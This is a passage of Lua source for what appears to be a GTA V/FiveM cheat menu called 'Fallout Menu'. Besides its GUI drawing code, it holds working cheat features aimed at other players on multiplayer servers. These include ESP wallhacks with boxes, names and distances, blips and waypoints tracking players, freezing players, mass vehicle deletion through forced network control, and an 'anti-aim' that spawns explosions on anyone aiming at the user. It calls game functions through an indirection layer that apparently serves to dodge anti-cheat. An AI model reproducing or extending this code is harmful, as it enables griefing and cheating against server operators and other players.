                       if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["R"]) then
                           self.Util:DeleteEntity(who)
                           ADRVSDD:AddNotification("INFO", "Hijack cancelled.")
       
                           return false
                       end
       
                       Wait(100)
                   end
               else
                   ADRVSDD:GetFunction("TaskEnterVehicle")(who, veh, 10000, -1, 2.0, 1, 0)
       
                   while ADRVSDD:GetFunction("DoesEntityExist")(veh) and ADRVSDD:GetFunction("GetPedInVehicleSeat")(veh, -1) ~= who and timeout <= 25000 do
                       timeout = timeout + 100
                       ADRVSDD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
                       ADRVSDD:GetFunction("SetVehicleDoorsLocked")(veh, 7)
                       ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(veh)
       
                       if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["R"]) then
                           self.Util:DeleteEntity(who)
                           ADRVSDD:AddNotification("INFO", "Hijack cancelled.")
       
                           return false
                       end
       
                       Wait(100)
                   end
               end
       
               ADRVSDD:GetFunction("ClearPedTasks")(who)
               ADRVSDD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(who, false)
               ADRVSDD:GetFunction("SetVehicleEngineOn")(veh, true)
               ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(veh)
       
               if not nodrive then
                   for i = 1, 5 do
                       ADRVSDD:GetFunction("TaskVehicleDriveWander")(who, veh, 120.0, 0)
                   end
               end
       
               ADRVSDD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, true)
               ADRVSDD:GetFunction("SetVehicleDoorsLocked")(veh, 2)
       
               return true
           end
       
           function ADRVSDD:ScrW()
               return self._ScrW
           end
       
           function ADRVSDD:ScrH()
               return self._ScrH
           end
       
           local print = _print or print
       
           function ADRVSDD:Print(...)
               local str = (...)
               if not ADRVSDD.Config.UsePrintMessages then return false end
               print("[Fallout Menu] " .. str)
       
               return true
           end
       
           function ADRVSDD:GetMousePos()
               return self._MouseX, self._MouseY
           end
       
           function ADRVSDD:RequestControlOnce(entity)
               if ADRVSDD:GetFunction("NetworkHasControlOfEntity")(entity) then return true end
               ADRVSDD:GetFunction("SetNetworkIdCanMigrate")(ADRVSDD:GetFunction("NetworkGetNetworkIdFromEntity")(entity), true)
       
               return ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(entity)
           end
       
           function ADRVSDD:RequestControlSync(veh, timeout)
               timeout = timeout or 2000
               local counter = 0
               self:RequestControlOnce(veh)
       
               while not ADRVSDD:GetFunction("NetworkHasControlOfEntity")(veh) do
                   counter = counter + 100
                   Wait(100)
                   if counter >= timeout then return false end
               end
       
               return true
           end
       
           function ADRVSDD:aG(aH, aI, aJ)
               return coroutine.wrap(function()
                   local aK, t = aH()
       
                   if not t or t == 0 then
                       aJ(aK)
       
                       return
                   end
       
                   local aF = {
                       handle = aK,
                       destructor = aJ
                   }
       
                   setmetatable(aF, aE)
                   local aL = true
                   repeat
                       coroutine.yield(t)
                       aL, t = aI(aK)
                   until not aL
                   aF.destructor, aF.handle = nil, nil
                   aJ(aK)
               end)
           end
       
           function ADRVSDD:EnumerateVehicles()
               return ADRVSDD:aG(ADRVSDD:GetFunction("FindFirstVehicle"), ADRVSDD:GetFunction("FindNextVehicle"), ADRVSDD:GetFunction("EndFindVehicle"))
           end
       
           function ADRVSDD:EnumeratePeds()
               return ADRVSDD:aG(ADRVSDD:GetFunction("FindFirstPed"), ADRVSDD:GetFunction("FindNextPed"), ADRVSDD:GetFunction("EndFindPed"))
           end
       
           function ADRVSDD:EnumerateObjects()
               return ADRVSDD:aG(ADRVSDD:GetFunction("FindFirstObject"), ADRVSDD:GetFunction("FindNextObject"), ADRVSDD:GetFunction("EndFindObject"))
           end
       
           function ADRVSDD:GetClosestVehicle(max_dist)
               local veh, dist = nil, dict.math.huge
               local cur = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
       
               for vehicle in self:EnumerateVehicles() do
                   local this = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(vehicle, 0.0, 0.0, 0.0)
       
                   if ADRVSDD:GetFunction("DoesEntityExist")(vehicle) then
                       local distance = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)
       
                       if distance < dist then
                           dist = distance
                           veh = vehicle
                       end
                   end
               end
       
               if dist > (max_dist or 10.0) then return end
       
               return veh, dist
           end
       
           function ADRVSDD:GetClosestPed(max_dist)
               local ped, dist = nil, dict.math.huge
               local cur = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
       
               for pedestrian in self:EnumeratePeds() do
                   local this = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(pedestrian, 0.0, 0.0, 0.0)
       
                   if ADRVSDD:GetFunction("DoesEntityExist")(pedestrian) then
                       local distance = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)
       
                       if distance < dist then
                           dist = distance
                           ped = pedestrian
                       end
                   end
               end
       
               if dist > (max_dist or 10.0) then return end
       
               return ped, dist
           end
       
           function ADRVSDD:GetClosestObject(max_dist)
               local obj, dist = nil, dict.math.huge
               local cur = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
       
               for object in self:EnumeratePeds() do
                   local this = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(object, 0.0, 0.0, 0.0)
       
                   if ADRVSDD:GetFunction("DoesEntityExist")(object) then
                       local distance = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)
       
                       if distance < dist then
                           dist = distance
                           obj = object
                       end
                   end
               end
       
               if dist > (max_dist or 10.0) then return end
       
               return obj, dist
           end
       
           function ADRVSDD:DeleteVehicles()
               local _veh = ADRVSDD:GetFunction("IsPedInAnyVehicle") and ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")())
       
               CreateThread(function()
                   for veh in ADRVSDD:EnumerateVehicles() do
                       if self:RequestControlSync(veh) and (veh ~= _veh or ADRVSDD.Config.OnlineIncludeSelf) then
                           ADRVSDD.Util:DeleteEntity(veh)
                       end
                   end
               end)
           end
       
           function ADRVSDD:RepairVehicle(vehicle)
               if vehicle == 0 then return false end
               ADRVSDD:RequestControlOnce(vehicle)
               ADRVSDD:GetFunction("SetVehicleFixed")(vehicle)
       
               return true
           end
       
           local was_dragging
       
           function ADRVSDD:TranslateMouse(wx, wy, ww, wh, drag_id)
               local mx, my = self:GetMousePos()
       
               if not self.DraggingX and not self.DraggingY then
                   self.DraggingX = mx
                   self.DraggingY = my
               end
       
               local mpx = self.DraggingX - wx
               local mpy = self.DraggingY - wy
       
               if self.DraggingX ~= mx or self.DraggingY ~= my then
                   self.DraggingX = mx
                   self.DraggingY = my
               end
       
               local dx = wx - (self.DraggingX - mpx)
               local dy = wy - (self.DraggingY - mpy)
       
               was_dragging = drag_id
       
               return wx - dx, wy - dy
           end
       
           local scroller_y
       
           function ADRVSDD:TranslateScroller(sy, sh, by)
               local _, my = self:GetMousePos()
       
               if not scroller_y then
                   scroller_y = my
               end
       
               local mpy = scroller_y - sy
       
               if scroller_y ~= my then
                   scroller_y = my
               end
       
               return mpy
           end
       
           local text_cache = {}
       
           local function _text_width(str, font, scale)
               font = font or 4
               scale = scale or 0.35
               text_cache[font] = text_cache[font] or {}
               text_cache[font][scale] = text_cache[font][scale] or {}
               if text_cache[font][scale][str] then return text_cache[font][scale][str].length end
               ADRVSDD:GetFunction("BeginTextCommandWidth")("STRING")
               ADRVSDD:GetFunction("AddTextComponentSubstringPlayerName")(str)
               ADRVSDD:GetFunction("SetTextFont")(font or 4)
               ADRVSDD:GetFunction("SetTextScale")(scale or 0.35, scale or 0.35)
               local length = ADRVSDD:GetFunction("EndTextCommandGetWidth")(1)
       
               text_cache[font][scale][str] = {
                   length = length
               }
       
               return length
           end
       
           function ADRVSDD.Painter:GetTextWidth(str, font, scale)
               return _text_width(str, font, scale) * ADRVSDD:ScrW()
           end
       
           function ADRVSDD.Painter:DrawText(text, font, centered, x, y, scale, r, g, b, a)
               ADRVSDD:GetFunction("SetTextFont")(font)
               ADRVSDD:GetFunction("SetTextScale")(scale, scale)
               ADRVSDD:GetFunction("SetTextCentre")(centered)
               ADRVSDD:GetFunction("SetTextColour")(r, g, b, a)
               ADRVSDD:GetFunction("BeginTextCommandDisplayText")("STRING")
               ADRVSDD:GetFunction("AddTextComponentSubstringPlayerName")(text)
               ADRVSDD:GetFunction("EndTextCommandDisplayText")(x / ADRVSDD:ScrW(), y / ADRVSDD:ScrH())
           end
       
           local listing
       
           local function _lerp(delta, from, to)
               if delta > 1 then return to end
               if delta < 0 then return from end
       
               return from + (to - from) * delta
           end
       
           local color_lists = {}
       
           function ADRVSDD.Painter:ListItem(label, px, py, x, y, w, h, r, g, b, a, id)
               if listing and not ADRVSDD:GetFunction("IsDisabledControlReleased")(0, 24) then
                   listing = nil
               end
       
               if not color_lists[id] then
                   color_lists[id] = {
                       r = 0,
                       g = 0,
                       b = 0
                   }
               end
       
               local bool = ADRVSDD.Config.SelectedCategory == id
       
               if bool then
                   color_lists[id].r = _lerp(0.1, color_lists[id].r, ADRVSDD.Tertiary[1])
                   color_lists[id].g = _lerp(0.1, color_lists[id].g, ADRVSDD.Tertiary[2])
                   color_lists[id].b = _lerp(0.1, color_lists[id].b, ADRVSDD.Tertiary[3])
               else
                   color_lists[id].r = _lerp(0.1, color_lists[id].r, 255)
                   color_lists[id].g = _lerp(0.1, color_lists[id].g, 255)
                   color_lists[id].b = _lerp(0.1, color_lists[id].b, 255)
               end
       
               self:DrawRect(px + x, py + y, w, h, r, g, b, a)
               self:DrawText(label, 4, true, px + w / 2, py + y - 5, 0.34, dict.math.ceil(color_lists[id].r), dict.math.ceil(color_lists[id].g), dict.math.ceil(color_lists[id].b), 255)
       
               if self:Holding(px + x, py + y, w, h, id) or ADRVSDD.Config.SelectedCategory == id then
                   if not listing and ADRVSDD.Config.SelectedCategory ~= id then
                       listing = true
       
                       return true
                   else
                       return false
                   end
               end
       
               return false
           end
       
           local selector
           local list_choices = {}
       
           function ADRVSDD.Painter:DrawSprite(x, y, w, h, heading, dict, name, r, g, b, a, custom)
               if not ADRVSDD:GetFunction("HasStreamedTextureDictLoaded")(dict) and not custom then
                   ADRVSDD:GetFunction("RequestStreamedTextureDict")(dict)
               end
       
               ADRVSDD:GetFunction("DrawSprite")(dict, name, x / ADRVSDD:ScrW(), y / ADRVSDD:ScrH(), w / ADRVSDD:ScrW(), h / ADRVSDD:ScrH(), heading, r, g, b, a)
           end
       
           local left_active, right_active
       
           function ADRVSDD.Painter:ListChoice(label, options, px, py, x, y, w, h, r, g, b, a, id, selected, unbind_caller)
               list_choices[id] = list_choices[id] or {
                   selected = selected or 1,
                   options = options
               }
       
               local ret
               local lR, lG, lB = 255, 255, 255
               local rR, rG, rB = 255, 255, 255
               self:DrawText(label, 4, false, px + x, py + y, 0.4, 255, 255, 255, 255)
               local width = self:GetTextWidth(label, 4, 0.4)
               local left_x, left_y = px + x + (width - 16.0), py + y + 13
       
               if self:Holding(left_x + 18 - 9.1, left_y - 5, 38.4, 19.2, 13.5, id .. "_left") then
                   if not left_active or left_active == id .. "_left" then
                       lR, lG, lB = ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3]
                   end
       
                   if not left_active then
                       left_active = id .. "_left"
                       local cur = list_choices[id].selected
                       local new = cur - 1
       
                       if not list_choices[id].options[new] then
                           new = #list_choices[id].options
                       end
       
                       list_choices[id].selected = new
                       ret = true
                   end
               elseif left_active == id .. "_left" then
                   left_active = nil
               end
       
               local cur = list_choices[id].options[list_choices[id].selected]
       
               if not cur then
                   cur = "NONE"
               end
       
               local cur_width = self:GetTextWidth(cur, 4, 0.4)
       
               if self:Holding(left_x + 18 + cur_width + 16.0 - 9.1, left_y - 5, 19.2, 13.5, id .. "_right") then
                   if not right_active or right_active == id .. "_right" then
                       rR, rG, rB = ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3]
                   end
       
                   if not right_active then
                       right_active = id .. "_right"
                       local cur = list_choices[id].selected
                       local new = cur + 1
       
                       if not list_choices[id].options[new] then
                           new = 1
                       end
       
                       list_choices[id].selected = new
                       ret = true
                   end
               elseif right_active == id .. "_right" then
                   right_active = nil
               end
       
               self:DrawText(cur, 4, false, left_x + 27, left_y - 14, 0.4, 255, 255, 255, 255)
               self:DrawSprite(left_x + 18, left_y + 2, 38.4, 27.0, 0.0, "commonmenu", "arrowleft", lR, lG, lB, 255)
               self:DrawSprite(left_x + 18 + cur_width + 16.0, left_y + 2, 38.4, 27.0, 0.0, "commonmenu", "arrowright", rR, rG, rB, 255)
       
               if self:Hovered(px + x, py + y + 8, width + 27 + cur_width, 10) and unbind_caller and ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["MOUSE2"]) and ADRVSDD.Config[unbind_caller] ~= "NONE" then
                   ADRVSDD.Config[unbind_caller] = "NONE"
                   list_choices[id].selected = -1
                   ADRVSDD.ConfigClass.Save(true)
                   ret = false
               end
       
       
               return ret
           end
       
           local checked
           local color_checks = {}
       
           function ADRVSDD.Painter:CheckBox(label, bool, px, py, x, y, w, h, r, g, b, a, id, centered, size)
               if not ADRVSDD:GetFunction("IsDisabledControlPressed")(0, 24) and checked then
                   checked = nil
               end
       
               if not color_checks[id] then
                   color_checks[id] = {
                       r = 0,
                       g = 0,
                       b = 0,
                       a = 0
                   }
               end
       
               self:DrawRect(px + x, py + y, 20, 20, 25, 25, 25, 200)
       
               if bool then
                   color_checks[id].r = _lerp(0.1, color_checks[id].r, ADRVSDD.Tertiary[1])
                   color_checks[id].g = _lerp(0.1, color_checks[id].g, ADRVSDD.Tertiary[2])
                   color_checks[id].b = _lerp(0.1, color_checks[id].b, ADRVSDD.Tertiary[3])
                   color_checks[id].a = _lerp(0.1, color_checks[id].a, 200)
               else
                   color_checks[id].r = _lerp(0.1, color_checks[id].r, 20)
                   color_checks[id].g = _lerp(0.1, color_checks[id].g, 20)
                   color_checks[id].b = _lerp(0.1, color_checks[id].b, 20)
                   color_checks[id].a = _lerp(0.1, color_checks[id].a, 0)
               end
       
               self:DrawRect(px + x + 2.5, py + y + 2.5, 15, 15, dict.math.ceil(color_checks[id].r), dict.math.ceil(color_checks[id].g), dict.math.ceil(color_checks[id].b), dict.math.ceil(color_checks[id].a))
               self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x + 25), py + y - 4, size or 0.37, r, g, b, a)
       
               if self:Holding(px + x, py + y, w, h, id) then
                   if not checked then
                       checked = id
       
                       if ADRVSDD.Config.UseSounds then
                           ADRVSDD:GetFunction("PlaySoundFrontend")(-1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", false)
                       end
       
                       return true
                   else
                       return false
                   end
               end
       
               return false
           end
       
           local activated
       
           function ADRVSDD.Painter:Button(label, px, py, x, y, w, h, r, g, b, a, id, centered, size)
               if not ADRVSDD:GetFunction("IsDisabledControlPressed")(0, 24) and activated then
                   activated = nil
               end
       
               if not w then
                   w = self:GetTextWidth(label, 4, size or 0.37)
               end
       
               if self:Holding(px + x, py + y, w, h, id) then
                   self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x), py + y, size or 0.37, ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3], ADRVSDD.Tertiary[4])
       
                   if not activated then
                       activated = id
       
                       if ADRVSDD.Config.UseSounds then
                           ADRVSDD:GetFunction("PlaySoundFrontend")(-1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", false)
                       end
       
                       return true
                   else
                       return false
                   end
               end
       
               self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x), py + y, size or 0.37, r, g, b, a)
       
               return false
           end
       
           function ADRVSDD.Painter:DrawRect(x, y, w, h, r, g, b, a)
               local _w, _h = w / ADRVSDD:ScrW(), h / ADRVSDD:ScrH()
               local _x, _y = x / ADRVSDD:ScrW() + _w / 2, y / ADRVSDD:ScrH() + _h / 2
               ADRVSDD:GetFunction("DrawRect")(_x, _y, _w, _h, r, g, b, a)
           end
       
           function ADRVSDD.Painter:Hovered(x, y, w, h)
               local mx, my = ADRVSDD:GetMousePos()
       
               if mx >= x and mx <= x + w and my >= y and my <= y + h then
                   return true
               else
                   return false
               end
           end
       
           local holding
       
           function ADRVSDD.Painter:Holding(x, y, w, h, id)
               if ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return end
               if holding == id and ADRVSDD:GetFunction("IsDisabledControlPressed")(0, 24) then return true end
               if holding ~= nil and ADRVSDD:GetFunction("IsDisabledControlPressed")(0, 24) then return end
       
               if self:Hovered(x, y, w, h) and ADRVSDD:GetFunction("IsDisabledControlPressed")(0, 24) then
                   holding = id
       
                   return true
               elseif holding == id and not self:Hovered(x, y, w, h) or not ADRVSDD:GetFunction("IsDisabledControlPressed")(0, 24) then
                   holding = nil
               end
       
               return false
           end
       
           local clicked
       
           function ADRVSDD.Painter:Clicked(x, y, w, h)
               if clicked then
                   if not ADRVSDD:GetFunction("IsDisabledControlPressed")(0, 24) then
                       clicked = false
                   end
       
                   return false
               end
       
               if self:Hovered(x, y, w, h) and ADRVSDD:GetFunction("IsDisabledControlJustReleased")(0, 24) then
                   clicked = true
       
                   return true
               end
       
               return false
           end
       
           function ADRVSDD:Clamp(what, min, max)
               if what < min then
                   return min
               elseif what > max then
                   return max
               else
                   return what
               end
           end
       
           function ADRVSDD:LimitRenderBounds()
               local cx, cy = self.Config.MenuX, self.Config.MenuY
               cx = self:Clamp(cx, 5, ADRVSDD:ScrW() - self.MenuW - 5)
               cy = self:Clamp(cy, 42, ADRVSDD:ScrH() - self.MenuH - 5)
               local nx, ny = self.Config.NotifX, self.Config.NotifY
       
               if nx and ny and self.Config.NotifW then
                   nx = self:Clamp(nx, 30, ADRVSDD:ScrW() - self.Config.NotifW - 30)
                   ny = self:Clamp(ny, 30, ADRVSDD:ScrH() - notifications_h - 30)
       
                   self.Config.NotifX = nx
                   self.Config.NotifY = ny
               end
       
               self.Config.MenuX = cx
               self.Config.MenuY = cy
           end
       
           function ADRVSDD:AddCategory(title, func)
               self.Categories[#self.Categories + 1] = {
                   Title = title,
                   Build = func
               }
           end
       
           function ADRVSDD:SetPedModel(model)
               if not self:RequestModelSync(model) then return self:AddNotification("ERROR", "Couldn't load model ~r~" .. model .. " ~w~in time.") end
               ADRVSDD:GetFunction("SetPlayerModel")(ADRVSDD:GetFunction("PlayerId")(), model)
           end
       
           function ADRVSDD:GetPedVehicleSeat(ped)
               local vehicle = ADRVSDD:GetFunction("GetVehiclePedIsIn")(ped, false)
               local invehicle = ADRVSDD:GetFunction("IsPedInAnyVehicle")(ped, false)
       
               if invehicle then
                   for i = -2, ADRVSDD:GetFunction("GetVehicleMaxNumberOfPassengers")(vehicle) do
                       if (ADRVSDD:GetFunction("GetPedInVehicleSeat")(vehicle, i) == ped) then return i end
                   end
               end
       
               return -2
           end
       
           function ADRVSDD:GetModelLength(ent)
               local min, max = ADRVSDD:GetFunction("GetModelDimensions")(ADRVSDD:GetFunction("GetEntityModel")(ent))
       
               return max.y - min.y
           end
       
           function ADRVSDD:GetModelHeight(ent)
               local min, max = ADRVSDD:GetFunction("GetModelDimensions")(ADRVSDD:GetFunction("GetEntityModel")(ent))
       
               return max.z - min.z
           end
       
           function ADRVSDD:Tracker()
               if not self.TrackingPlayer then return end
       
               if not ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
                   self.TrackingPlayer = nil
       
                   return
               end
       
               local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("GetPlayerPed")(self.TrackingPlayer, 0.0, 0.0, 0.0))
               ADRVSDD:GetFunction("SetNewWaypoint")(coords.x, coords.y)
           end
       
           function ADRVSDD:DoFrozen()
               for src, bool in dict.pairs(frozen_players) do
                   src = dict.tonumber(src)
                   local ped = ADRVSDD:GetFunction("GetPlayerPed")(src)
       
                   if ADRVSDD:GetFunction("DoesEntityExist")(ped) and bool then
                       ADRVSDD:GetFunction("ClearPedTasks")(ped)
                       ADRVSDD:GetFunction("ClearPedTasksImmediately")(ped)
                       ADRVSDD:GetFunction("DisablePlayerFiring")(src, true)
                   end
               end
           end
       
           local blips = {}
       
           function ADRVSDD:DoBlips(remove)
               if remove or not ADRVSDD.Config.Player.Blips or not ADRVSDD.Enabled then
                   if remove or #blips > 0 then
                       for src, blip in dict.pairs(blips) do
                           ADRVSDD:GetFunction("RemoveBlip")(blip)
                           blips[src] = nil
                       end
                   end
       
                   return
               end
       
               for src, blip in dict.pairs(blips) do
                   if not ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD:GetFunction("GetPlayerPed")(src)) then
                       ADRVSDD:GetFunction("RemoveBlip")(blip)
                       blips[src] = nil
                   else
                       local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("GetPlayerPed")(src, 0.0, 0.0, 0.0))
                       local head = ADRVSDD:GetFunction("GetEntityHeading")(ADRVSDD:GetFunction("GetPlayerPed")(src))
                       ADRVSDD:GetFunction("SetBlipCoords")(blip, coords.x, coords.y, coords.z)
                       ADRVSDD:GetFunction("SetBlipRotation")(blip, dict.math.ceil(head))
                       ADRVSDD:GetFunction("SetBlipCategory")(blip, 7)
                       ADRVSDD:GetFunction("SetBlipScale")(blip, 0.87)
                   end
               end
       
               for id, src in dict.pairs(ADRVSDD.PlayerCache) do
                   src = dict.tonumber(src)
       
                   if ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD:GetFunction("GetPlayerPed")(src)) and not blips[src] and src ~= PlayerId() then
                       local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("GetPlayerPed")(src, 0.0, 0.0, 0.0))
                       local head = ADRVSDD:GetFunction("GetEntityHeading")(ADRVSDD:GetFunction("GetPlayerPed")(src))
                       local blip = ADRVSDD:GetFunction("AddBlipForCoord")(coords.x, coords.y, coords.z)
                       ADRVSDD:GetFunction("SetBlipSprite")(blip, 1)
                       ADRVSDD:GetFunction("ShowHeadingIndicatorOnBlip")(blip, true)
                       ADRVSDD:GetFunction("SetBlipRotation")(blip, dict.math.ceil(head))
                       ADRVSDD:GetFunction("SetBlipScale")(blip, 0.87)
                       ADRVSDD:GetFunction("SetBlipCategory")(blip, 7)
                       ADRVSDD:GetFunction("BeginTextCommandSetBlipName")("STRING")
                       ADRVSDD:GetFunction("AddTextComponentSubstringPlayerName")(ADRVSDD:GetFunction("GetPlayerName")(src))
                       ADRVSDD:GetFunction("EndTextCommandSetBlipName")(blip)
                       blips[src] = blip
                   end
               end
           end
       
           function ADRVSDD:DoAntiAim()
               if not self.Config.Player.AntiAim then return end
       
               for id, src in dict.pairs(ADRVSDD.PlayerCache) do
                   src = dict.tonumber(src)
                   local ped = ADRVSDD:GetFunction("GetPlayerPed")(src)
                   local ret, ent = ADRVSDD:GetFunction("GetEntityPlayerIsFreeAimingAt")(src)
       
                   if ret and ent == ADRVSDD:GetFunction("PlayerPedId")() then
                       local pos = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                       ADRVSDD:GetFunction("AddExplosion")(pos.x, pos.y, pos.z, 18, 1.0, false, true, 10.0)
                   end
               end
           end
       
           function ADRVSDD:TeleportToWaypoint()
               local waypoint = ADRVSDD:GetFunction("GetFirstBlipInfoId")(8)
               if not DoesBlipExist(waypoint) then return ADRVSDD:AddNotification("ERROR", "No waypoint!", 5000) end
               local coords = ADRVSDD:GetFunction("GetBlipInfoIdCoord")(waypoint)
       
               CreateThread(function()
                   for height = 100, -100, -5 do
                       ADRVSDD:GetFunction("SetPedCoordsKeepVehicle")(ADRVSDD:GetFunction("PlayerPedId")(), coords.x, coords.y, height + 0.0)
                       local foundGround, zPos = ADRVSDD:GetFunction("GetGroundZFor_3dCoord")(coords.x, coords.y, height + 0.0)
       
                       if foundGround then
                           ADRVSDD:GetFunction("SetPedCoordsKeepVehicle")(ADRVSDD:GetFunction("PlayerPedId")(), coords.x, coords.y, zPos + 0.0)
                           break
                       end
       
                       Wait(5)
                   end
       
                   ADRVSDD:AddNotification("SUCCESS", "Teleported to waypoint.")
               end)
           end
       
           local esp_talk_col = ADRVSDD.Tertiary
       
           function ADRVSDD:DoESP()
               if not self.Config.Player.ESP then return end
               local spot = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
       
               if self.FreeCam and self.FreeCam.On and camX and camY and camZ then
                   spot = vector3(camX, camY, camZ)
               elseif self.SpectatingPlayer and ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
                   spot = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("GetPlayerPed")(self.SpectatingPlayer, 0.0, 0.0, 0.0))
               elseif self.RCCam and self.RCCam.On and rc_camX and rc_camY and rc_camZ then
                   spot = vector3(rc_camX, rc_camY, rc_camZ)
               end
       
                for id, src in dict.pairs(ADRVSDD.PlayerCache) do
                   src = dict.tonumber(src)
                   local ped = ADRVSDD:GetFunction("GetPlayerPed")(src)
       
                   if ADRVSDD:GetFunction("DoesEntityExist")(ped) and ped ~= ADRVSDD:GetFunction("PlayerPedId")() then
                       local _id = dict.tonumber(ADRVSDD:GetFunction("GetPlayerServerId")(src))
                       local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector_origin.x, vector_origin.y, vector_origin.z)
                       local dist = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(spot.x, spot.y, spot.z, coords.x, coords.y, coords.z)
                       local seat = dict.tonumber(ADRVSDD:GetPedVehicleSeat(ped))
       
                       if seat ~= -2 then
                           seat = seat + 0.25
                       end
       
                       if dist <= ADRVSDD.Config.Player.ESPDistance then
                           local pos_z = coords.z + 1.2
       
                           if seat ~= -2 then
                               pos_z = pos_z + seat
                           end
       
                           local _on_screen, _, _ = ADRVSDD:GetFunction("GetScreenCoordFromWorldCoord")(coords.x, coords.y, pos_z)
       
                           if _on_screen then
                               if self.Config.Player.Box then
                                   self:DoBoxESP(src, ped)
                               end
       
                               if ADRVSDD:GetFunction("NetworkIsPlayerTalking")(src) then
                                   self:Draw3DText(coords.x, coords.y, pos_z, _id .. " | " .. ADRVSDD:CleanName(ADRVSDD:GetFunction("GetPlayerName")(src), true) .. " [" .. dict.math.ceil(dist) .. "M" .. "]", esp_talk_col[1], esp_talk_col[2], esp_talk_col[3])
                               else
                                   self:Draw3DText(coords.x, coords.y, pos_z, _id .. " | " .. ADRVSDD:CleanName(ADRVSDD:GetFunction("GetPlayerName")(src), true) .. " [" .. dict.math.ceil(dist) .. "M" .. "]", 255, 255, 255)
                               end
                           end
                       end
                   end
               end
           end
       
           function ADRVSDD:DoBoxESP(src, ped)
               local r, g, b, a = 255, 255, 255, 255
       
               if ADRVSDD:GetFunction("NetworkIsPlayerTalking")(src) then
                   r, g, b = esp_talk_col[1], esp_talk_col[2], esp_talk_col[3]
               end
       
               local model = ADRVSDD:GetFunction("GetEntityModel")(ped)
               local min, max = ADRVSDD:GetFunction("GetModelDimensions")(model)
               local top_front_right = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, max)
               local top_back_right = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, min.y, max.z))
               local bottom_front_right = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, max.y, min.z))
               local bottom_back_right = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, min.y, min.z))
               local top_front_left = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, max.y, max.z))
               local top_back_left = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, min.y, max.z))
               local bottom_front_left = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, max.y, min.z))
               local bottom_back_left = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, min)
               -- LINES
               -- RIGHT SIDE
               ADRVSDD:GetFunction("DrawLine")(top_front_right, top_back_right, r, g, b, a)
               ADRVSDD:GetFunction("DrawLine")(top_front_right, bottom_front_right, r, g, b, a)
               ADRVSDD:GetFunction("DrawLine")(bottom_front_right, bottom_back_right, r, g, b, a)
               ADRVSDD:GetFunction("DrawLine")(top_back_right, bottom_back_right, r, g, b, a)
               -- LEFT SIDE
               ADRVSDD:GetFunction("DrawLine")(top_front_left, top_back_left, r, g, b, a)
               ADRVSDD:GetFunction("DrawLine")(top_back_left, bottom_back_left, r, g, b, a)
               ADRVSDD:GetFunction("DrawLine")(top_front_left, bottom_front_left, r, g, b, a)
               ADRVSDD:GetFunction("DrawLine")(bottom_front_left, bottom_back_left, r, g, b, a)
               -- Connection
